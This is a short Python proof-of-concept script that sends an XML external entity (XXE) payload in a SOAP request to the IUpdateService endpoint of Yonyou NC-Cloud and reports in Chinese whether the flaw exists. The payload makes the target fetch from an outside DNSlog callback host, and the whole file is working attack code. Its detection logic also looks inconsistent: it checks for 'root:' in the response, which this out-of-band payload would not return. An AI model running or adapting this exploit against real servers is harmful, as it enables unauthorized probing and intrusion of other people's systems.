import requests

def check_yonyou_nc_cloud_IUpdateService_xxe(url):
    try:
        headers = {
            'Content-Type': 'text/xml;charset=UTF-8',
            'SOAPAction': 'urn:getResult'
        }
        data = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
        <soapenv:Header/>
        <soapenv:Body>
        <iup:getResult>
        <!--type: string-->
        <iup:string><![CDATA[
        <!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://c2vkbwbs.dnslog.pw">%aaa;%ccc;%ddd;]>
        <xxx/>]]></iup:string>
        </iup:getResult>
        </soapenv:Body>
        </soapenv:Envelope>
        """
        response = requests.post(f"{url}/uapws/service/nc.uap.oba.update.IUpdateService", headers=headers, data=data)
        if "root:" in response.text:
            return "用友NC-Cloud IUpdateService XXE漏洞存在"
        else:
            return "用友NC-Cloud IUpdateService XXE漏洞不存在"
    except Exception as e:
        return f"Error: {e}"